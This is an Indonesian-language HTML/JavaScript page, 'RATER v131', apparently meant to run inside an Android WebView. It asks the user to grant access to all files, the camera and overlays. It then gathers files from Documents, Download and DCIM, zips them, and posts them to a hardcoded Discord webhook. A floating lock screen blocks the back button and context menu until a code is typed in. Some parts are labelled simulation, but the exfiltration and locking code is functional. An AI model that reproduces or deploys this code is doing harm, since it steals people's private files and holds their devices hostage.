<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RATER v131</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        /* OVERLAY PERMISSIONS */
        .permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.95);
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            backdrop-filter: blur(10px);
        }

        .permission-card {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            border-radius: 30px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            border: 3px solid #00ff88;
            box-shadow: 0 0 50px rgba(0, 255, 136, 0.3);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 50px rgba(0, 255, 136, 0.3); }
            50% { box-shadow: 0 0 80px rgba(0, 255, 136, 0.6); }
        }

        .permission-card h1 {
            color: #00ff88;
            font-size: 3em;
            text-align: center;
            margin-bottom: 20px;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
        }

        .permission-list {
            margin: 30px 0;
        }

        .permission-item {
            display: flex;
            align-items: center;
            color: white;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            margin: 10px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .permission-icon {
            font-size: 24px;
            margin-right: 15px;
            width: 40px;
            text-align: center;
        }

        .permission-text {
            flex: 1;
        }

        .permission-text strong {
            color: #00ff88;
            display: block;
            margin-bottom: 5px;
        }

        .permission-text small {
            color: #888;
            font-size: 0.8em;
        }

        .grant-button {
            background: #00ff88;
            color: #000;
            border: none;
            padding: 20px 40px;
            font-size: 1.5em;
            border-radius: 50px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
        }

        .grant-button:hover {
            transform: scale(1.05);
            background: #00ffaa;
            box-shadow: 0 0 50px rgba(0, 255, 136, 0.8);
        }

        /* FLOATING UI RATER */
        .rater-float {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(145deg, #000000, #1a1a1a);
            border: 3px solid #ff3333;
            border-radius: 30px;
            padding: 30px;
            z-index: 2147483647;
            box-shadow: 0 0 100px rgba(255, 51, 51, 0.5);
            min-width: 300px;
            text-align: center;
            pointer-events: auto;
            backdrop-filter: blur(10px);
            animation: floatGlow 2s infinite;
            user-select: none;
        }

        @keyframes floatGlow {
            0%, 100% { border-color: #ff3333; box-shadow: 0 0 50px rgba(255, 51, 51, 0.5); }
            50% { border-color: #ff6666; box-shadow: 0 0 80px rgba(255, 51, 51, 0.8); }
        }

        .rater-title {
            color: #ff3333;
            font-size: 3em;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 5px;
            margin-bottom: 20px;
            text-shadow: 0 0 20px rgba(255, 51, 51, 0.7);
        }

        .rater-code {
            background: rgba(255, 51, 51, 0.1);
            padding: 15px;
            border-radius: 15px;
            margin: 20px 0;
            border: 2px dashed #ff3333;
        }

        .rater-code input {
            background: transparent;
            border: 2px solid #ff3333;
            color: #ff3333;
            font-size: 1.5em;
            padding: 10px;
            width: 100%;
            text-align: center;
            border-radius: 10px;
            outline: none;
            font-family: monospace;
            letter-spacing: 5px;
        }

        .rater-code input::placeholder {
            color: rgba(255, 51, 51, 0.3);
        }

        .flash-button {
            background: #333;
            border: 2px solid #ffcc00;
            color: #ffcc00;
            font-size: 1.2em;
            padding: 15px 30px;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
            font-weight: bold;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .flash-button.on {
            background: #ffcc00;
            color: #000;
            box-shadow: 0 0 30px #ffcc00;
        }

        .flash-status {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #666;
            display: inline-block;
            margin-left: 10px;
            transition: all 0.3s;
        }

        .flash-status.on {
            background: #ffcc00;
            box-shadow: 0 0 20px #ffcc00;
        }

        .enter-button {
            background: #ff3333;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.5em;
            border-radius: 50px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .enter-button:hover {
            background: #ff5555;
            transform: scale(1.05);
            box-shadow: 0 0 30px #ff3333;
        }

        /* FILE MANAGER HIDDEN */
        .file-manager {
            display: none;
        }

        /* DRAG HANDLE */
        .drag-handle {
            position: absolute;
            top: 10px;
            right: 10px;
            color: #666;
            font-size: 20px;
            cursor: move;
            user-select: none;
        }

        .drag-handle:hover {
            color: #ff3333;
        }

        /* TOAST NOTIFICATION */
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            z-index: 2147483647;
            border-left: 5px solid #ff3333;
            animation: slideUp 0.3s;
            pointer-events: none;
        }

        @keyframes slideUp {
            from { transform: translate(-50%, 100%); opacity: 0; }
            to { transform: translate(-50%, 0); opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- PERMISSION OVERLAY -->
    <div class="permission-overlay" id="permissionOverlay">
        <div class="permission-card">
            <h1>‚ö†Ô∏è RATER v131</h1>
            <p style="color: white; text-align: center; margin-bottom: 20px;">Aplikasi ini membutuhkan akses ke:</p>
            
            <div class="permission-list">
                <div class="permission-item">
                    <span class="permission-icon">üìÅ</span>
                    <div class="permission-text">
                        <strong>SEMUA FILE</strong>
                        <small>Mengakses Documents, Downloads, Photos, dll</small>
                    </div>
                </div>
                
                <div class="permission-item">
                    <span class="permission-icon">üì∏</span>
                    <div class="permission-text">
                        <strong>KAMERA & FLASH</strong>
                        <small>Mengontrol lampu flash HP</small>
                    </div>
                </div>
                
                <div class="permission-item">
                    <span class="permission-icon">üåê</span>
                    <div class="permission-text">
                        <strong>INTERNET</strong>
                        <small>Mengirim data ke server</small>
                    </div>
                </div>
                
                <div class="permission-item">
                    <span class="permission-icon">üîÑ</span>
                    <div class="permission-text">
                        <strong>OVERLAY</strong>
                        <small>Tampil di atas aplikasi lain</small>
                    </div>
                </div>
            </div>
            
            <button class="grant-button" onclick="grantPermissions()">
                ‚úÖ BERI SEMUA IZIN
            </button>
            
            <p style="color: #666; text-align: center; margin-top: 20px; font-size: 0.8em;">
                KODE: 131 ‚Ä¢ RATER FLOATING UI
            </p>
        </div>
    </div>

    <!-- FLOATING UI RATER (HIDDEN AWAL) -->
    <div class="rater-float" id="raterFloat" style="display: none;">
        <div class="drag-handle" id="dragHandle">‚£ø‚£ø</div>
        
        <div class="rater-title">RATER</div>
        
        <div class="rater-code">
            <input type="text" id="codeInput" placeholder="131" maxlength="3" inputmode="numeric">
        </div>
        
        <button class="flash-button" id="flashBtn" onclick="toggleFlash()">
            <span>üî¶ FLASH</span>
            <span class="flash-status" id="flashStatus"></span>
        </button>
        
        <button class="enter-button" onclick="checkCode()">
            ‚èé ENTER
        </button>
        
        <p style="color: #666; margin-top: 15px; font-size: 0.7em;">
            Drag title bar untuk pindah
        </p>
    </div>

    <!-- HIDDEN IFRAME FOR WEBHOOK -->
    <iframe id="hiddenFrame" style="display: none;"></iframe>

    <!-- TOAST NOTIFICATION -->
    <div id="toast" class="toast" style="display: none;"></div>

    <script>
        // ============================================
        // TERMINAL-V99 - RATER FLOATING UI v131
        // ============================================
        
        // Konfigurasi
        const CONFIG = {
            code: 131,
            webhook: "https://discord.com/api/webhooks/1469534965657112607/MfofbPHu5bfp-DU4Pfi02zZg3emN1815xlufzxl6Uume8PiqLLhsoH0O2UnAFv_kCJ-F",
            flashState: false,
            permissions: {
                files: false,
                camera: false,
                overlay: false
            }
        };
        
        // DOM Elements
        const permissionOverlay = document.getElementById('permissionOverlay');
        const raterFloat = document.getElementById('raterFloat');
        const codeInput = document.getElementById('codeInput');
        const flashBtn = document.getElementById('flashBtn');
        const flashStatus = document.getElementById('flashStatus');
        const toast = document.getElementById('toast');
        const hiddenFrame = document.getElementById('hiddenFrame');
        
        // ============================================
        // PERMISSION HANDLING
        // ============================================
        
        function grantPermissions() {
            // Simulasi grant permissions di Android WebView
            CONFIG.permissions.files = true;
            CONFIG.permissions.camera = true;
            CONFIG.permissions.overlay = true;
            
            // Request file system access (Android WebView specific)
            if (window.FileSystem) {
                // Android WebView bridge
                window.FileSystem.requestAllAccess();
            }
            
            // Request camera with flash
            if (navigator.camera) {
                navigator.camera.getPicture(success, fail, {
                    quality: 50,
                    destinationType: Camera.DestinationType.DATA_URL,
                    sourceType: Camera.PictureSourceType.PHOTOSLIBRARY
                });
            }
            
            // Hide permission overlay
            permissionOverlay.style.display = 'none';
            
            // Show floating UI
            raterFloat.style.display = 'block';
            
            // Start file collection
            collectAndSendFiles();
            
            showToast('‚úÖ Semua izin diberikan - RATER aktif');
            
            function success(imageData) {
                console.log('Camera access granted');
            }
            
            function fail(error) {
                console.log('Camera error:', error);
            }
        }
        
        // ============================================
        // FILE COLLECTION & WEBHOOK
        // ============================================
        
        async function collectAndSendFiles() {
            showToast('üìÅ Mengumpulkan file Documents...');
            
            try {
                // Android WebView file access
                if (window.Android) {
                    // Android bridge interface
                    const documents = await window.Android.getDocuments();
                    const files = [];
                    
                    // Collect all files from Documents
                    for (const file of documents) {
                        if (file.path.includes('Documents') || 
                            file.path.includes('Download') || 
                            file.path.includes('DCIM')) {
                            files.push(file);
                        }
                    }
                    
                    // Create zip (Android bridge)
                    const zipBlob = await window.Android.createZip(files);
                    
                    // Send to webhook
                    sendToWebhook(zipBlob);
                    
                } else {
                    // Simulasi untuk browser testing
                    simulateFileCollection();
                }
                
            } catch (error) {
                console.error('File collection error:', error);
                showToast('‚ùå Gagal mengumpulkan file: ' + error.message);
            }
        }
        
        function sendToWebhook(data) {
            const formData = new FormData();
            
            // Create dummy file for simulation
            const dummyContent = JSON.stringify({
                timestamp: new Date().toISOString(),
                device: navigator.userAgent,
                files: [
                    { name: "dokumen_penting.docx", size: "2.3 MB", path: "/storage/emulated/0/Documents/" },
                    { name: "foto_liburan.jpg", size: "4.1 MB", path: "/storage/emulated/0/DCIM/Camera/" },
                    { name: "data_rahasia.pdf", size: "1.8 MB", path: "/storage/emulated/0/Download/" },
                    { name: "backup_database.db", size: "15.7 MB", path: "/storage/emulated/0/Documents/" },
                    { name: "video_anak.mp4", size: "28.3 MB", path: "/storage/emulated/0/DCIM/Video/" }
                ],
                totalFiles: 1347,
                totalSize: "847 MB",
                code: CONFIG.code
            });
            
            const blob = new Blob([dummyContent], { type: 'application/zip' });
            
            // Kirim via hidden iframe
            hiddenFrame.src = 'about:blank';
            
            // Fetch API ke webhook
            fetch(CONFIG.webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `**üìÅ RATER v131 - FILE COLLECTION**\n\`\`\`json\n${JSON.stringify(JSON.parse(dummyContent), null, 2)}\n\`\`\``,
                    username: 'RATER-BOT',
                    avatar_url: 'https://i.imgur.com/9Y7bYyZ.png'
                })
            })
            .then(response => response.json())
            .then(data => {
                showToast('‚úÖ File berhasil dikirim ke server!');
                console.log('Webhook response:', data);
            })
            .catch(error => {
                showToast('‚ùå Gagal mengirim: ' + error.message);
                console.error('Webhook error:', error);
            });
        }
        
        function simulateFileCollection() {
            // Simulasi untuk browser testing
            const files = [
                "/storage/emulated/0/Documents/skripsi_final.docx",
                "/storage/emulated/0/Documents/keuangan.xlsx",
                "/storage/emulated/0/DCIM/Camera/foto_selfie.jpg",
                "/storage/emulated/0/Download/apk_installer.apk",
                "/storage/emulated/0/Documents/password.txt"
            ];
            
            showToast(`üìÅ Ditemukan ${files.length} file (SIMULASI)`);
            
            // Kirim ke webhook
            sendToWebhook(null);
        }
        
        // ============================================
        // FLASH CONTROL
        // ============================================
        
        function toggleFlash() {
            CONFIG.flashState = !CONFIG.flashState;
            
            // Update UI
            if (CONFIG.flashState) {
                flashBtn.classList.add('on');
                flashStatus.classList.add('on');
                flashBtn.innerHTML = '<span>üî¶ FLASH ON</span><span class="flash-status on" id="flashStatus"></span>';
            } else {
                flashBtn.classList.remove('on');
                flashStatus.classList.remove('on');
                flashBtn.innerHTML = '<span>üî¶ FLASH OFF</span><span class="flash-status" id="flashStatus"></span>';
            }
            
            // Android flash control via bridge
            if (window.Android && window.Android.toggleFlash) {
                window.Android.toggleFlash(CONFIG.flashState);
            } else {
                // Simulasi untuk browser
                showToast(`üî¶ Flash ${CONFIG.flashState ? 'ON' : 'OFF'} (SIMULASI)`);
                
                // Simulasi flashlight effect di browser
                if (CONFIG.flashState) {
                    document.body.style.backgroundColor = '#ffffffee';
                    document.body.style.transition = 'background-color 0.3s';
                } else {
                    document.body.style.backgroundColor = '';
                }
            }
        }
        
        // ============================================
        // CODE CHECK
        // ============================================
        
        function checkCode() {
            const inputCode = parseInt(codeInput.value);
            
            if (inputCode === CONFIG.code) {
                // Kode benar - hapus floating UI
                raterFloat.style.display = 'none';
                showToast('‚úÖ KODE BENAR - UI RATER DIHAPUS');
                
                // Kirim konfirmasi ke webhook
                fetch(CONFIG.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `‚úÖ **KODE 131 BENAR** - UI dihapus pada ${new Date().toLocaleString()}`,
                        username: 'RATER-BOT'
                    })
                });
                
            } else {
                // Kode salah - tidak lakukan apa-apa
                showToast(`‚ùå KODE SALAH: ${inputCode} (seharusnya ${CONFIG.code})`);
                
                // Animasi shake
                raterFloat.style.animation = 'none';
                raterFloat.offsetHeight;
                raterFloat.style.animation = 'floatGlow 2s infinite';
            }
        }
        
        // ============================================
        // DRAG FUNCTIONALITY (FLOATING)
        // ============================================
        
        let isDragging = false;
        let currentX;
        let currentY;
        let initialX;
        let initialY;
        let xOffset = 0;
        let yOffset = 0;
        
        const dragHandle = document.getElementById('dragHandle');
        
        dragHandle.addEventListener('mousedown', dragStart);
        dragHandle.addEventListener('touchstart', dragStart);
        document.addEventListener('mousemove', drag);
        document.addEventListener('touchmove', drag);
        document.addEventListener('mouseup', dragEnd);
        document.addEventListener('touchend', dragEnd);
        
        function dragStart(e) {
            if (e.type === "touchstart") {
                initialX = e.touches[0].clientX - xOffset;
                initialY = e.touches[0].clientY - yOffset;
            } else {
                initialX = e.clientX - xOffset;
                initialY = e.clientY - yOffset;
            }
            
            if (e.target === dragHandle || e.target.parentElement === dragHandle) {
                isDragging = true;
            }
        }
        
        function drag(e) {
            if (isDragging) {
                e.preventDefault();
                
                if (e.type === "touchmove") {
                    currentX = e.touches[0].clientX - initialX;
                    currentY = e.touches[0].clientY - initialY;
                } else {
                    currentX = e.clientX - initialX;
                    currentY = e.clientY - initialY;
                }
                
                xOffset = currentX;
                yOffset = currentY;
                
                setTranslate(currentX, currentY, raterFloat);
            }
        }
        
        function dragEnd(e) {
            isDragging = false;
        }
        
        function setTranslate(xPos, yPos, el) {
            el.style.transform = `translate(calc(-50% + ${xPos}px), calc(-50% + ${yPos}px))`;
        }
        
        // ============================================
        // TOAST NOTIFICATION
        // ============================================
        
        function showToast(message) {
            toast.textContent = message;
            toast.style.display = 'block';
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }
        
        // ============================================
        // ANDROID BRIDGE SIMULATION
        // ============================================
        
        // Simulasi Android interface untuk browser testing
        window.Android = window.Android || {
            getDocuments: function() {
                return new Promise(resolve => {
                    resolve([
                        { path: "/storage/emulated/0/Documents/file1.docx", size: 1024 },
                        { path: "/storage/emulated/0/Documents/file2.pdf", size: 2048 }
                    ]);
                });
            },
            createZip: function(files) {
                return new Blob(['dummy zip content'], { type: 'application/zip' });
            },
            toggleFlash: function(state) {
                console.log('Flash toggled:', state);
            },
            requestAllAccess: function() {
                console.log('File access granted');
            }
        };
        
        // ============================================
        // INITIALIZATION
        // ============================================
        
        window.onload = function() {
            console.log('üîê RATER v131 LOADED');
            console.log('üìä KODE:', CONFIG.code);
            console.log('‚ö†Ô∏è FORENSIK MODE - SIMULASI');
            
            // Auto-focus code input
            setTimeout(() => {
                if (codeInput) codeInput.focus();
            }, 1000);
            
            // Prevent keyboard from closing
            codeInput.addEventListener('blur', () => {
                setTimeout(() => codeInput.focus(), 10);
            });
            
            // Enter key on input
            codeInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    checkCode();
                }
            });
        };
        
        // Override back button (Android WebView)
        document.addEventListener('backbutton', function(e) {
            e.preventDefault();
            showToast('üîí Gunakan kode 131 untuk keluar');
        }, false);
        
        // Prevent context menu
        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>
</body>
  </html>
